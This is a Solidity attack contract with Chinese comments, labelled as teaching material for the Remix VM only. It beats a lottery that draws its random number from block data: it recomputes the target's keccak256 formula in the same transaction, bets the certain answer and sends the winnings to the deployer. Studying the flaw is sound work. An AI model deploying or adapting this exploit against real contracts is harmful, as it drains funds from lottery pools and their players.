// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * ⚠️ 仅供学习、请勿用于攻击真实合约。仅在 Remix VM 演示。
 *
 * 预测"链上伪随机数"的攻击合约。
 * 关键：它在【同一笔交易】里用与目标【完全相同的公式】算出结果，
 * 然后拿这个必中答案去下注 —— 因为在同一个区块里，
 * block.timestamp / prevrandao / blockhash 都是相同的已知值。
 *
 * 注意：攻击合约调用 guess 时，目标合约里的 msg.sender 变成"本攻击合约地址"，
 * 所以复现公式时也要用 address(this)，保持一致。
 */

interface IVulnerableLottery {
    function guess(uint256 number) external payable;
}

contract RandomnessAttacker {
    IVulnerableLottery public immutable lottery;
    address payable public immutable attacker;

    constructor(address lotteryAddr) {
        lottery = IVulnerableLottery(lotteryAddr);
        attacker = payable(msg.sender);
    }

    /// 用与目标一模一样的公式预测（msg.sender 用 address(this)，因为下注的是本合约）
    function _predict() private view returns (uint256) {
        return uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.prevrandao,
                    blockhash(block.number - 1),
                    address(this) // 目标里的 msg.sender = 本攻击合约
                )
            )
        ) % 100;
    }

    /// 一次交易内：先算出必中答案，再下注，稳赢奖池
    function attack() external payable {
        require(msg.value == 0.01 ether, "need 0.01 ETH for ticket");
        uint256 answer = _predict();
        lottery.guess{value: 0.01 ether}(answer); // 同区块，公式一致 → 必中
    }

    receive() external payable {}

    function withdraw() external {
        attacker.transfer(address(this).balance);
    }
}
